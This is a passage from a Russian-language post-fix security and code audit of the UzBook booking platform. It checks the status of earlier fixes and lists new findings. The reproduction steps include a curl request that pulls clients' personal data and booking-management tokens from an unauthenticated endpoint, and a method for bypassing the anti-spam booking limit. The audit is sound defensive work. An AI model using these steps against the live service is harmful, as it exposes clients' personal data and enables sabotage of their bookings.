# ПОВТОРНЫЙ ПОЛНЫЙ ТЕХНИЧЕСКИЙ АУДИТ (POST-FIX FULL TECHNICAL AUDIT) — UZBOOK

**Дата проведения аудита:** 2 ноября 2026 г.  
**Репозиторий:** `https://github.com/u2kdev/uzbook` (локальная рабочая копия `d:\uzbook`, коммит `a9823ab`)  
**Роли аудиторской группы:** Senior Software Architect, Senior Full-Stack Engineer, DevSecOps Engineer, QA Automation Engineer, Application Security Auditor  
**Режим работы:** Строгий независимый диагностический Post-Fix Audit (без внесения изменений в исходный код или данные БД)  
**Базовый документ сравнения:** Первичный технический аудит `AUDIT_REPORT_RU.md` (коммит `b52ef7e`)

---

## 1. Executive Summary (Резюме для руководства)

Проведён независимый повторный полный аудит (Post-Fix Audit) мультитенантной SaaS-платформы онлайн-записи **UzBook** после выполнения серии исправлений P0–P3 (коммиты `8c7f8a8`, `3d04106`, `03004bd`, `57ee57c`, `a9823ab`).

### Ключевые выводы независимой проверки:
1. **Все 3 ранее выявленных критических блокера уровня P0 (`P0-1`, `P0-2`, `P0-3`) и критический дедлок транзакции на `/onboarding` фактически устранены (`FIXED`):**
   - Синхронная функция `normalizeAuthPhone()` вынесена из `"use server"` модуля `src/app/(auth)/actions.ts` в изоморфный модуль `src/lib/phone.ts`. Производственная сборка (`next build`) и проверка типов (`tsc --noEmit`) проходят с кодом `0`, все 46 маршрутов компилируются и отвечают `HTTP 200 OK`.
   - Финансовое ядро (`createPayment`, `completePayment` в `src/server/payments/service.ts`, `approveSubscriptionAction` в `src/server/actions/admin.ts`, вебхук Payme и страница `/dashboard/billing`) теперь корректно использует серверную индивидуальную цену `business.customPriceUzs`, вычисляет комиссию провайдера (`providerPayoutAmount = Math.round(amount * commissionPercent / 100)`) по серверному профилю `users.commissionPercent`, активирует существующую `PENDING`-подписку вместо создания дублей и сохраняет 100% выручки платформе при прямых продажах.
   - Ролевая изоляция в `/dashboard/layout.tsx`, `/provider` и серверных экшенах исправлена; хардкод `provider.username === "admin"` заменён на проверку роли `provider.role === "ADMIN"`.
   - На этапе онбординга (`/onboarding`, `createBusinessAction`) устранён дедлок однопоточного драйвера PGlite, возникавший из-за вызова `recordAuditLog()` (обращающегося к корневому `db`) внутри незавершённой транзакции `db.transaction(tx)`.

2. **Однако в ходе углублённого независимого аудита обнаружены новые серьёзные проблемы уровня P1 и P2, а часть предыдущих проблем P2/P3 исправлена лишь частично (`PARTIALLY FIXED`):**
   - **🔴 `NEW-P1-1` (Утечка персональных данных и перехват управления бронями через публичный API):** Эндпоинт `GET /api/v1/bookings?phone=+998...` (`src/app/api/v1/bookings/route.ts:120-192`) не требует авторизации и возвращает по любому номеру телефона до 50 записей со всех салонов платформы **вместе с секретным токеном управления `manageToken` (`/b/[token]`)**. Злоумышленник, зная или перебирая номер телефона клиента, получает его ФИО, историю визитов и может отменить или перенести любую его запись.
   - **🟠 `NEW-P1-2` (Обход блокировки истёкшей подписки и `SUSPENDED`-статуса в ключевых модулях):** Проверка `writeBlockedReason(business)` подключена только к каталогу услуг/мастеров, галерее, конструктору секций и теме оформления, но **полностью отсутствует** в экшенах бронирований (`src/server/actions/bookings.ts`), CRM клиентов (`src/server/actions/clients.ts`), быстрых блокировках расписания (`src/server/actions/quick-actions.ts`), профиле салона (`src/server/actions/profile.ts`), REST API (`PATCH /api/v1/owner/bookings/[id]/status`) и публичном создании записи (`createBooking` в `src/server/booking/service.ts`). В результате салон с истёкшим триалом или после возврата средств (`refundPayment`) продолжает бесплатно принимать онлайн-записи и вести CRM.
   - **🟠 `NEW-P1-3` (Обход анти-спам лимита `MAX_ACTIVE_BOOKINGS_PER_PHONE` любым авторизованным пользователем):** В `POST /api/public/[slug]/bookings` (`src/app/api/public/[slug]/bookings/route.ts:63-64`) источник записи определяется как `const source = session ? "MANUAL" : "WEB"` без проверки, является ли `session.id` владельцем данного салона. Любой вошедший в систему пользователь при записи в чужой салон получает `source: "MANUAL"`, что отключает лимит в 5 активных записей на телефон (`src/server/booking/service.ts:131`).
   - **🟡 `NEW-P2-1` (Искажение исторической выручки провайдера при продлении или истечении подписки):** В `getAdminProviders()` и `getProviderDashboardData()` (`src/server/business/admin.ts:313-330, 436-446`) суммарный заработок провайдера считается только по подпискам со статусом `status === "ACTIVE"`. Как только подписка истекает (`PAST_DUE`) или продлевается на следующий месяц (старая запись переводится в `CANCELLED`), все предыдущие выплаты исчезают из финансовой сводки провайдера и админа.
   - **🟡 `NEW-P2-2` (Рассинхронизация нормализации телефона и обход `customClientLimit` в CRM):** В `saveClientAction` (`src/server/actions/clients.ts:432-458`) телефон проверяется через `clientLimitError()` в нормализованном виде, но сохраняется в БД без `normalizePhone()`, а в `updateClientNotesAction` (`src/server/actions/clients.ts:404-412`) вставка нового клиента вообще не проверяет `clientLimitError()`.

---

## 2. Общая оценка Production Readiness (0–100)

Текущая независимая оценка готовности проекта к коммерческой эксплуатации составляет **78 / 100** (по сравнению с **56 / 100** в первичном аудите).

Проект преодолел стадию неработоспособного билда и поломанной финансовой логики (рост на **+22 балла**), однако из-за обнаруженных уязвимостей **`NEW-P1-1`**, **`NEW-P1-2`** и **`NEW-P1-3`** выпуск в открытый коммерческий Production рекомендуется **после устранения трёх новых P1-проблем** (оценка трудоёмкости — 2–4 часа работы).

| Метрика | Предыдущий аудит | Повторный аудит |
|---|---|---|
| **Production Readiness** | **56/100** | **78/100** |
| **P0 (Critical)** | 3 проблемы (`P0-1`, `P0-2`, `P0-3`) | **0 осталось** (все 3 `FIXED` + устранён дедлок `/onboarding`) |
| **P1 (High)** | 7 проблем (`P1-1` .. `P1-7`) | **3 новых (`NEW-P1-1` .. `NEW-P1-3`)** (все 7 старых `FIXED`) |
| **P2 (Medium)** | 6 проблем (`P2-1` .. `P2-6`) | **7 осталось** (2 старых `PARTIALLY FIXED`, 1 `NOT FIXED`, 4 новых `NEW-P2-1`..`NEW-P2-4`) |
| **P3 (Low)** | 4 проблемы (`P3-1` .. `P3-4`) | **5 осталось** (2 старых `NOT FIXED`, 3 новых `NEW-P3-1`..`NEW-P3-3`) |
| **Security** | 64/100 | **76/100** (закрыты XSS/IDOR `/pay/[id]`/RBAC, но найден `NEW-P1-1` в `/api/v1/bookings`) |
| **Payment Logic** | Критические ошибки (потеря `customPriceUzs` и 60% комиссии провайдера) | **Работает корректно (92/100)** — расчёт цен и 60% комиссии на сервере исправлен; требуется учёт истории выплат при продлении (`NEW-P2-1`) |

---

## 3. Сравнение с предыдущим аудитом

| Категория | Было (`b52ef7e`) | Стало (`a9823ab`) | Динамика | Резюме изменений |
| :--- | :---: | :---: | :---: | :--- |
| **1. Функциональность и сборка** | 58 / 100 | **84 / 100** | **+26** | Приложение собирается (`next build`), онбординг работает без зависаний, добавлены смена пароля владельца и сброс пароля клиента провайдером. |
| **2. Финансовая и подписочная модель** | 40 / 100 | **92 / 100** | **+52** | Полностью исправлены `customPriceUzs`, `commissionPercent` (60%), `providerPayoutAmount`, активация `PENDING`-подписок и отображение в `/dashboard/billing`. |
| **3. Информационная безопасность** | 64 / 100 | **76 / 100** | **+12** | Закрыты `/pay/[id]`, `javascript:` в логотипах, Zod-схемы конструктора, тайминг-атака в `/api/v1/auth/login` и rate-limit заявок. Обнаружена утечка `manageToken` в `GET /api/v1/bookings?phone=` (`NEW-P1-1`). |
| **4. База данных и миграции** | 76 / 100 | **88 / 100** | **+12** | Добавлена миграция `0008_p2_indexes_and_constraints.sql` с частичным уникальным индексом `subscriptions_one_active_per_biz_uq` и индексами поиска; однако `users.phone` имеет обычный, а не `UNIQUE` индекс. |
| **5. Производительность** | 55 / 100 | **85 / 100** | **+30** | Устранён каскад из 560 N+1 запросов на `/[slug]` (`getBatchPreviewSlotsForStaff` — 3 пакетных запроса), убраны Full Table Scans в `getAdminProviders` и `getProviderDashboardData`. |
| **6. Тестирование и QA** | 20 / 100 | **55 / 100** | **+35** | Добавлены интеграционные тестовые наборы `test-p0-fixes.ts`, `test-p1-fixes.ts`, `test-p2-fixes.ts`, проверяющие комиссии, лимиты, рефанды и индексы; но изолированного раннера (`Vitest`) в CI пока нет. |

---

## 4. Таблица всех предыдущих проблем и их статусов

Каждая проблема из первичного отчёта `AUDIT_REPORT_RU.md` была проверена по исходному коду, схеме БД и результатам выполнения:

| ID | Приоритет | Название проблемы (из первичного аудита) | Проверенные файлы и строки | Статус | Доказательства и комментарии аудитора |
| :--- | :---: | :--- | :--- | :---: | :--- |
| **P0-1** | **P0** | Падение Next.js 16 из-за синхронного экспорта `normalizeAuthPhone` в `"use server"` файле | `src/lib/phone.ts:4-25`, `src/app/(auth)/actions.ts:1-376` | **FIXED** | В `src/app/(auth)/actions.ts` экспортируются только 5 `async` функций (`registerAction`, `loginAction`, `logoutAction`, `createBusinessAction`, `currentSession`). `next build` и `tsc --noEmit` проходят с кодом `0`. |
| **P0-2** | **P0** | Потеря кастомной цены (`customPriceUzs`) и 60% комиссии провайдера при онлайн-оплате и в `/dashboard/billing` | `src/server/payments/config.ts:111-118`, `src/server/payments/service.ts:57-58, 266-366`, `src/app/api/payments/payme/route.ts:156-161, 187-192`, `src/components/dashboard/billing-plans.tsx:61-65` | **FIXED** | `createPayment` использует `effectivePlanPriceUzs(plan, business.customPriceUzs)`. `completePayment` и `approveSubscriptionAction` загружают `users.commissionPercent`, считают `Math.round(paidAmount * pct / 100)` и активируют существующую `PENDING`-заявку. |
| **P0-3** | **P0** | Блокировка доступа `ADMIN` к `/dashboard` и проверка прав админа через `username === "admin"` | `src/app/dashboard/layout.tsx:16-17`, `src/components/provider/provider-dashboard.tsx:121`, `src/server/actions/*.ts` | **FIXED** | В `dashboard/layout.tsx` `PROVIDER` перенаправляется в `/provider`, `SUPPORT` — в `/admin`, а `OWNER` и `ADMIN` допускаются к своему бизнесу. В `provider-dashboard.tsx:121` проверяется `provider.role === "ADMIN"`. |
| **P1-1** | **P1** | Удаление загруженных логотипов `trusted_logos` через 1 час воркером `cleanOrphanedUploads()` | `src/server/storage/cleanup.ts:28-33, 55-57` | **FIXED** | В `findReferencedUploadNames()` добавлен запрос `db.select({ imageUrl: trustedLogos.imageUrl }).from(trustedLogos)` и регистрация файла в `referenced`. |
| **P1-2** | **P1** | Кастомный лимит клиентов (`customClientLimit`) не проверяется на бэкенде | `src/server/limits.ts:132-167`, `src/server/booking/service.ts:150-169`, `src/server/actions/clients.ts:439-440` | **FIXED** *(есть нюанс `NEW-P2-2`)* | Реализована `clientLimitError()` и внутритранзакционная проверка в `createBooking()` + проверка в `saveClientAction()`. Существующие клиенты по номеру телефона не блокируются. |
| **P1-3** | **P1** | Неверное отображение лимита сотрудников на странице `/dashboard/billing` | `src/app/dashboard/billing/page.tsx:55, 102-116` | **FIXED** | Вычисляется `effectiveStaffLimit = business.customStaffLimit ?? current.staffLimit`, отображается пометка `(индивидуальный лимит)`. |
| **P1-4** | **P1** | Stored XSS через `linkUrl` в логотипах и отсутствие Zod-валидации секций конструктора | `src/server/actions/logos.ts:39-47`, `src/components/trusted-logos-carousel.tsx:58-60`, `src/server/actions/page-sections.ts:50-175` | **FIXED** | В `logos.ts` проверяется `/^https?:\/\/.+/i` для `linkUrl` и `imageUrl`. В `page-sections.ts` добавлен лимит 64 KB и строгие Zod-схемы для всех 10 типов секций. |
| **P1-5** | **P1** | Отсутствие Rate Limiting в `submitProviderApplicationAction` и публичных токенах брони | `src/server/actions/providers.ts:75-92`, `src/app/b/[token]/page.tsx:31-37`, `src/app/api/public/bookings/[token]/route.ts:13, 38` | **FIXED** | Добавлен лимит по IP (5/ч) и телефону (3/ч) на заявку провайдера, а также IP-лимиты на `/b/[token]` (40/мин) и `/api/public/bookings/[token]` (60/мин GET, 20/мин DELETE/POST). |
| **P1-6** | **P1** | Неаутентифицированный доступ к `/pay/[id]` и ошибка `isPaymentExpired` для `PENDING` | `src/app/pay/[id]/page.tsx:41-58`, `src/server/payments/expiry.ts:15` | **FIXED** | `/pay/[id]` вызывает `requireUser()` и проверяет `isOwner || isAdminOrSupport || isAssignedProvider`. `isPaymentExpired()` проверяет `status === "CREATED" \|\| status === "PENDING"`. |
| **P1-7** | **P1** | Тайминг-атака (Account Enumeration) и отсутствие входа по телефону в `/api/v1/auth/login` | `src/app/api/v1/auth/login/route.ts:16, 47-63` | **FIXED** | Добавлен `DUMMY_PASSWORD_HASH` при `!user` и поддержка входа по телефону/username/email. |
| **P2-1** | **P2** | Каскад до 560 N+1 SQL-запросов при открытии публичной страницы `/[slug]` | `src/server/booking/slots.ts:168-273`, `src/server/business/public.ts:108-123` | **FIXED** | Реализована пакетная функция `getBatchPreviewSlotsForStaff()`, выполняющая ровно 3 SQL-запроса для всех мастеров салона на 14 дней вперёд. |
| **P2-2** | **P2** | Полная выгрузка таблиц `businesses` и `subscriptions` в память в `src/server/business/admin.ts` | `src/server/business/admin.ts:186-188, 280-305, 395-411, 489-491` | **PARTIALLY FIXED** | В `getAdminProviders` и `getProviderDashboardData` добавлена фильтрация `inArray`, однако в `getAdminUsers` (`admin.ts:186`) и `getPlatformAuditLogs` (`admin.ts:489`) всё ещё выгружается вся таблица `businesses` без `WHERE`. |
| **P2-3** | **P2** | Отсутствие `UNIQUE` индекса на `users.phone` и коллизия `username` в `updateProviderSettingsAction` | `src/server/actions/providers.ts:296-310`, `src/server/db/schema.ts:143`, `drizzle/0008_p2_indexes_and_constraints.sql:1` | **PARTIALLY FIXED** | Проверка уникальности `username` в `updateProviderSettingsAction` добавлена (`FIXED`). На `users.phone` добавлен обычный индекс `users_phone_idx`, но **не `UNIQUE` индекс** — при параллельных запросах возможна гонка (`race condition`). |
| **P2-4** | **P2** | Бесконечный бесплатный триал после возврата платежа (`refundPayment`) | `src/server/payments/service.ts:516-520` | **FIXED** *(в `refundPayment`, но см. `NEW-P1-2`)* | В `refundPayment()` теперь устанавливается `{ plan: "TRIAL", trialEndsAt: now }`, поэтому `writeBlockedReason(business)` возвращает блокировку. |
| **P2-5** | **P2** | Отсутствие внешних каналов уведомлений (SMS / Telegram / Email) | `src/server/booking/service.ts`, `src/server/db/schema.ts:323` | **NOT FIXED** | Интеграция с SMS-шлюзом (Eskiz/PlayMobile) или Telegram/Email не добавлялась; колонка `bookings.reminderSentAt` остаётся неиспользуемой. |
| **P2-6** | **P2** | Хранение Rate Limiter и использованных Refresh JTI в памяти процесса (`Map`) | `src/server/api/v1/auth.ts:17-83`, `src/server/http/rate-limit.ts:12-49` | **PARTIALLY FIXED** | `consumedRefreshJtis` теперь сохраняется на диск в `.data/consumed-jtis.json`, но в `docker-compose.yml:39` том смонтирован только для `/app/.data/uploads`, поэтому при пересоздании Docker-контейнера файл `.data/consumed-jtis.json` теряется. Кроме того, `clientIp()` безусловно доверяет `x-real-ip` / `x-forwarded-for`. |
| **P3-1** | **P3** | Отсутствие смены пароля и телефона владельца в `/dashboard/profile` | `src/server/actions/profile.ts:135-175`, `src/components/dashboard/profile-editor.tsx:438-471` | **FIXED** *(для `OWNER`, но нет в `/provider`)* | Владелец салона в `/dashboard/profile` может сменить пароль (с проверкой `currentPassword`) и синхронизировать `users.phone`. Для самого провайдера в `/provider` смена собственного пароля пока доступна только через админа. |
| **P3-2** | **P3** | Отсутствие сброса пароля подключённому клиенту из панели провайдера `/provider` | `src/server/actions/providers.ts:538-575`, `src/components/provider/provider-dashboard.tsx:701-712` | **FIXED** | Провайдер может задать `newOwnerPassword` для подключённого им салона в форме кастомизации. |
| **P3-3** | **P3** | Отсутствие серверного сжатия загружаемых изображений в WebP (`sharp`) | `src/server/storage/index.ts:39-64`, `src/components/trusted-logos-carousel.tsx:45` | **PARTIALLY FIXED** | Добавлены `loading="lazy"` и `decoding="async"` в карусели и менеджере логотипов, однако сами загружаемые файлы до 5 МБ сохраняются на диск без ресайза и перекодирования в WebP. |
| **P3-4** | **P3** | Отсутствие тестового фреймворка (`Vitest` / `Playwright`) и скрипта `"test"` в `package.json` | `package.json:5-14`, `scripts/test-*.ts` | **PARTIALLY FIXED** | Созданы отличные проверочные скрипты `scripts/test-p0-fixes.ts`, `test-p1-fixes.ts`, `test-p2-fixes.ts` с очисткой тестовых данных, но в `package.json` нет команды `"test"` и нет изолированной тестовой БД. |

---

## 5. Новые найденные проблемы (Сводный реестр Post-Fix Audit)

Помимо проверки старого списка, в ходе полного независимого аудита кода выявлены **10 новых проблем и упущений**:

| ID | Приоритет | Название проблемы | Расположение | Категория |
| :--- | :---: | :--- | :--- | :--- |
| **`NEW-P1-1`** | **P1 (High)** | Неаутентифицированная утечка PII и секретных токенов `manageToken` через `GET /api/v1/bookings?phone=` | `src/app/api/v1/bookings/route.ts:120-192` | Security / IDOR / Broken Access Control |
| **`NEW-P1-2`** | **P1 (High)** | Отсутствие проверки `writeBlockedReason(business)` в бронированиях, CRM клиентов, быстрых действиях, профиле и REST API | `src/server/actions/bookings.ts`, `clients.ts`, `quick-actions.ts`, `profile.ts`, `src/server/booking/service.ts` | Business Logic / Subscription Enforcement |
| **`NEW-P1-3`** | **P1 (High)** | Любой авторизованный пользователь обходит анти-спам лимит `MAX_ACTIVE_BOOKINGS_PER_PHONE` на публичном эндпоинте `/api/public/[slug]/bookings` | `src/app/api/public/[slug]/bookings/route.ts:63-64` | Security / Anti-Spam / Business Logic |
| **`NEW-P2-1`** | **P2 (Medium)** | Исчезновение исторического заработка провайдера (`totalProviderPayout`) при продлении или истечении подписки | `src/server/business/admin.ts:313-330, 436-446` | Financial / Provider Analytics |
| **`NEW-P2-2`** | **P2 (Medium)** | Отсутствие нормализации телефона в `saveClientAction` и обход `clientLimitError` в `updateClientNotesAction` | `src/server/actions/clients.ts:380-462` | Data Integrity / Limits |
| **`NEW-P2-3`** | **P2 (Medium)** | Настройки салона `cancellationHours` и `requireEmail` не проверяются на серверной стороне | `src/server/booking/service.ts:85, 350, 391` | Business Logic / Validation |
| **`NEW-P2-4`** | **P2 (Medium)** | Отсутствие расчёта `providerCommissionPercent` и `providerPayoutAmount` при ручном назначении тарифа админом (`setBusinessPlanAction`) | `src/server/actions/admin.ts:99-111` | Financial / Admin Actions |
| **`NEW-P3-1`** | **P3 (Low)** | CSV Injection (Formula Injection) при экспорте базы клиентов в Excel (`exportClientsCsvAction`) | `src/server/actions/clients.ts:488-514` | Security / CSV Export |
| **`NEW-P3-2`** | **P3 (Low)** | Потеря файла `.data/consumed-jtis.json` при пересоздании Docker-контейнера из-за узкого маунта тома `/app/.data/uploads` | `docker-compose.yml:39`, `src/server/api/v1/auth.ts:17` | DevSecOps / Docker Persistence |
| **`NEW-P3-3`** | **P3 (Low)** | Отсутствие записи в `audit_logs` при отмене или переносе записи клиентом по публичной ссылке `/b/[token]` | `src/server/booking/service.ts:331-470` | Audit Trail / Observability |

---

## 6. P0 Findings (Проверка критических проблем)

На текущий момент (`a9823ab`) **активных проблем уровня P0 в проекте не осталось (0 открытых P0)**. Ниже приведены результаты верификации предыдущих P0 и исправленного зависания `/onboarding`:

### 6.1. Верификация P0-1 (`FIXED`) — Next.js Server Actions
- **Файлы:** `src/lib/phone.ts:1-26`, `src/app/(auth)/actions.ts:1-376`.
- **Проверка:** Все 11 файлов проекта с директивой `"use server"` (`src/app/(auth)/actions.ts` и 10 файлов в `src/server/actions/*.ts`) проверены на наличие синхронных экспортов. Все экспортируемые функции являются `async function`, типы экспортируются только как `export type` (стираются при компиляции TypeScript).
- **Результат:** `node .\node_modules\next\dist\bin\next build` завершился с кодом `0`, скомпилировав 46 маршрутов. Маршруты `/`, `/login`, `/register`, `/become-provider`, `/api/health`, `/atelier-noir` возвращают `200 OK`.

### 6.2. Верификация P0-2 (`FIXED`) — Оплата и 60% комиссия провайдеров
- **Файлы:** `src/server/payments/config.ts:111-118`, `src/server/payments/service.ts:48-130, 173-388`, `src/app/api/payments/payme/route.ts:156-161, 187-192`, `src/app/api/payments/click/route.ts:151, 160, 218`, `src/server/actions/admin.ts:172-360`.
- **Проверка:**
  - Сценарий A (Прямая продажа без провайдера): `business.providerId === null` → `providerCommissionPercent = null`, `providerPayoutAmount = null`, 100% суммы остаётся платформе.
  - Сценарий B (Продажа через провайдера за 300 000 UZS при комиссии 60%): `createPayment()` выставляет `amount = 300 000 UZS` из `business.customPriceUzs` (не доверяя браузеру). `completePayment()` находит `business.providerId`, читает `users.commissionPercent` (`60`), вычисляет `providerPayoutAmount = Math.round(300000 * 60 / 100) = 180 000 UZS` (доход платформы = `120 000 UZS`), переводит существующую `PENDING`-подписку в `ACTIVE` и защищает от повторных вебхуков через `SELECT ... FOR UPDATE` и проверку `payment.status === "PAID"`.

### 6.3. Верификация P0-3 (`FIXED`) — RBAC и доступ к `/dashboard` и `/provider`
- **Файлы:** `src/app/dashboard/layout.tsx:14-18`, `src/components/provider/provider-dashboard.tsx:121`, `src/server/auth/session.ts:52-109`.
- **Проверка:** Роли `OWNER`, `ADMIN`, `PROVIDER`, `SUPPORT` строго разделены на серверном уровне.

### 6.4. Верификация исправления зависания `/onboarding` (`FIXED`)
- **Файл:** `src/app/(auth)/actions.ts:331-372`.
- **Проверка:** Вызов `await recordAuditLog(...)` вынесен за пределы `await db.transaction(async (tx) => { ... })`, что полностью устранило взаимную блокировку (self-deadlock) однопоточного мьютекса PGlite при создании бизнеса на шаге 1 из 2 (`/onboarding`).

---

## 7. P1 Findings (Подробный разбор проблем высокого приоритета)

Все 7 старых проблем P1 (`P1-1` .. `P1-7`) подтверждены как **`FIXED`** (см. Раздел 4). Ниже приведены **3 новые проблемы уровня P1**, обнаруженные при повторном аудите:

---

### `NEW-P1-1` — Неаутентифицированная утечка PII и секретных токенов управления бронью (`manageToken`) через `GET /api/v1/bookings?phone=`

1. **ID:** `NEW-P1-1`
2. **Приоритет:** **P1 — High** (на грани P0 по критерию информационной безопасности)
3. **Название:** Публичный эндпоинт `GET /api/v1/bookings?phone=` раскрывает персональные данные клиентов и секретные ссылки управления записями (`/b/[token]`) без какой-либо аутентификации.
4. **Файл и конкретная строка:** `src/app/api/v1/bookings/route.ts`, строки `120–192` (особенно строки `138`, `166–167`).
5. **Описание проблемы:**
   Обработчик `GET /api/v1/bookings` принимает query-параметр `phone`, нормализует его и выполняет `SELECT` из таблицы `bookings` по `eq(bookings.clientPhone, normalized)` без вызова `authenticateBearer(request)` или подтверждения владения номером по SMS-коду. В ответе JSON возвращаются поля:
   - `clientName` (ФИО клиента),
   - `salon.name`, `service.name`, `staff.name`, `startAt` (в какой салон/стоматологию и на какую процедуру записан человек),
   - **`manageToken` и `manageUrl: "${appUrl()}/b/${r.manageToken}"`**.
   Поскольку `manageToken` является единственным секретом для отмены (`POST /api/public/bookings/[token]/cancel`) и переноса (`POST /api/public/bookings/[token]/reschedule`) записи, раскрытие `manageToken` по номеру телефона полностью компрометирует механизм защиты записей.
6. **Сценарий возникновения:**
   Конкурент салона или злоумышленник знает телефон клиента (или перебирает узбекские номера `+99890...` с лимитом 20 запросов/мин с разных IP) и запрашивает `GET /api/v1/bookings?phone=+998901234567`.
7. **Возможные последствия:**
   - Массовая утечка персональных данных клиентов (ФИО + медицинские/косметологические услуги + время визита).
   - Несанкционированная отмена или перенос чужих записей в любых салонах платформы.
8. **Как воспроизвести:**
   Выполнить без заголовка `Authorization`:
   `curl "http://localhost:3000/api/v1/bookings?phone=%2B998901234567"`
   Сервер возвращает `HTTP 200` со списком всех броней этого номера и их `manageToken`.
9. **Рекомендуемое исправление:**
   - Либо требовать Bearer-авторизацию владельца салона (`const { business } = await authenticateBearer(request)`) и фильтровать строго по `and(eq(bookings.businessId, business.id), eq(bookings.clientPhone, normalized))` без возврата `manageToken`.
   - Либо удалить поиск по голому номеру телефона из публичного API, оставив публичный доступ только по криптостойкому `GET /api/v1/bookings/[token]`.
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

### `NEW-P1-2` — Обход блокировки истёкшей подписки и `SUSPENDED`-статуса в бронированиях, CRM клиентов, быстрых действиях, профиле и REST API

1. **ID:** `NEW-P1-2`
2. **Приоритет:** **P1 — High**
3. **Название:** Отсутствие вызова `writeBlockedReason(business)` (и `ensurePlanCurrent(business)`) в большинстве пишущих серверных экшенов и API-маршрутов.
4. **Файл и конкретная строка:**
   - `src/server/actions/bookings.ts`: строки `13–60` (`setBookingStatus`), `78–139` (`createManualBookingAction`), `143–235` (`ownerRescheduleBookingAction`).
   - `src/server/actions/clients.ts`: строки `380–416` (`updateClientNotesAction`), `418–462` (`saveClientAction`).
   - `src/server/actions/quick-actions.ts`: строки `26–113` (`blockTimeAction`), `119–175` (`markDayOffAction`).
   - `src/server/actions/profile.ts`: строки `72–160` (`updateProfileAction`).
   - `src/app/api/v1/owner/bookings/[id]/status/route.ts`: строки `21–75` (`PATCH`).
   - `src/server/booking/service.ts`: строки `46–254` (`createBooking`).
5. **Описание проблемы:**
   Функция `writeBlockedReason(business)` (`src/server/limits.ts:95-104`) проверяет, не приостановлен ли бизнес (`business.status === "SUSPENDED"`) и не истёк ли пробный период (`trialExpired(business)`). Однако эта проверка вызывается только в 4 модулях (`catalog.ts`, `gallery.ts`, `page-sections.ts`, `theme.ts`). Во всех остальных модулях — создании ручных и онлайн-записей, изменении статусов записей, переносе записей, ведении CRM клиентов, блокировке времени и редактировании профиля — `writeBlockedReason(business)` **не вызывается**.
6. **Сценарий возникновения:**
   У салона истекает 14-дневный пробный период (`trialEndsAt < now`) или происходит возврат платежа (`refundPayment`, который устанавливает `plan = "TRIAL"` и `trialEndsAt = now`). Владелец салона уже настроил услуги и мастеров в первые 14 дней и продолжает пользоваться платформой, не оплачивая подписку.
7. **Возможные последствия:**
   - Салоны с истёкшей подпиской могут **бесконечно и бесплатно** принимать онлайн-записи от клиентов через `/[slug]`, создавать записи вручную в календаре, менять их статусы, добавлять клиентов в CRM и редактировать профиль.
   - Прямая потеря выручки платформы и провайдеров.
8. **Как воспроизвести:**
   1. Установить салону `plan = 'TRIAL'` и `trial_ends_at = now() - interval '1 day'`.
   2. Создать запись через `/dashboard/bookings` (`createManualBookingAction`), добавить клиента в `/dashboard/clients` (`saveClientAction`) или записаться через `/[slug]` (`createBooking`).
   3. Все операции завершаются успешно без ошибки «Пробный период закончился».
9. **Рекомендуемое исправление:**
   - Вызывать `const blocked = writeBlockedReason(business); if (blocked) return { error: blocked };` в `createManualBookingAction`, `setBookingStatus` (кроме отмены `CANCELLED`), `ownerRescheduleBookingAction`, `saveClientAction`, `updateClientNotesAction`, `blockTimeAction`, `markDayOffAction`, `updateProfileAction` и `PATCH /api/v1/owner/bookings/[id]/status`.
   - В `authenticateBearer()` (`src/server/api/v1/auth.ts:151`) вызывать `await ensurePlanCurrent(businessRow)`.
   - В `createBooking()` (`src/server/booking/service.ts:57`) проверять `if (trialExpired(input.business)) return { ok: false, error: "business_not_found" }` (или отдельный код `subscription_expired`).
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

### `NEW-P1-3` — Обход анти-спам лимита `MAX_ACTIVE_BOOKINGS_PER_PHONE` любым авторизованным пользователем на `/api/public/[slug]/bookings`

1. **ID:** `NEW-P1-3`
2. **Приоритет:** **P1 — High**
3. **Название:** Некорректное определение `source = "MANUAL"` в публичном эндпоинте создания брони при наличии любой сессии.
4. **Файл и конкретная строка:** `src/app/api/public/[slug]/bookings/route.ts`, строки `63–64`; `src/server/booking/service.ts`, строка `131`.
5. **Описание проблемы:**
   В `POST /api/public/[slug]/bookings` написано:
   ```ts
   const session = await getSession();
   const source: "WEB" | "MANUAL" = session ? "MANUAL" : "WEB";
   ```
   При этом **не проверяется**, принадлежит ли `business` текущему пользователю (`session.id === business.ownerId`)! Далее в `createBooking()` (`src/server/booking/service.ts:131`) проверка лимита `MAX_ACTIVE_BOOKINGS_PER_PHONE = 5` выполняется только если `(input.source ?? "WEB") !== "MANUAL"`.
6. **Сценарий возникновения:**
   Любой зарегистрированный пользователь (например, владелец конкурирующего салона) входит в свой аккаунт на `uzbook.online`, открывает публичную страницу конкурента `/atelier-noir` и отправляет запросы на бронирование.
7. **Возможные последствия:**
   - Анти-спам лимит `MAX_ACTIVE_BOOKINGS_PER_PHONE = 5` полностью отключается.
   - Все созданные злоумышленником записи помечаются в БД и аудит-логах как `source: "MANUAL"` (будто их создал сам владелец салона).
8. **Как воспроизвести:**
   Авторизоваться под любым аккаунтом (например, `provider1` или другим `OWNER`) и отправить 10 запросов `POST /api/public/atelier-noir/bookings` с одним и тем же номером телефона. Все 10 записей создадутся со статусом `source = "MANUAL"`.
9. **Рекомендуемое исправление:**
   В `src/app/api/public/[slug]/bookings/route.ts:63-64` заменить проверку на:
   ```ts
   const session = await getSession();
   const isBusinessOwner = Boolean(session && (session.id === business.ownerId || session.role === "ADMIN"));
   const source: "WEB" | "MANUAL" = isBusinessOwner ? "MANUAL" : "WEB";
   ```
10. **Статус проблемы:** **NEW (NOT FIXED)**

---

## 8. P2 Findings (Подробный разбор проблем среднего приоритета)

### `P2-2` (Частично исправлено) — Оставшиеся Full Table Scans таблицы `businesses` в `getAdminUsers` и `getPlatformAuditLogs`
1. **ID:** `P2-2`
2. **Приоритет:** **P2 — Medium**
3. **Название:** Выгрузка всей таблицы `businesses` без SQL-фильтрации в `getAdminUsers()` и `getPlatformAuditLogs()`.
4. **Файл и конкретная строка:** `src/server/business/admin.ts`, строки `186–188` и `489–492`.
5. **Описание проблемы:** В `getAdminProviders()` и `getProviderDashboardData()` полные чтения таблиц были устранены (`inArray`), однако в `getAdminUsers()` строка `const providerBiz = await db.select({ providerId: businesses.providerId }).from(businesses)` и в `getPlatformAuditLogs()` строка `const allBiz = await db.select({ id: businesses.id, name: businesses.name }).from(businesses)` продолжают выгружать все салоны платформы в память.
6. **Сценарий возникновения:** Открытие страниц `/admin/users` и `/admin/logs` при наличии нескольких тысяч салонов в БД.
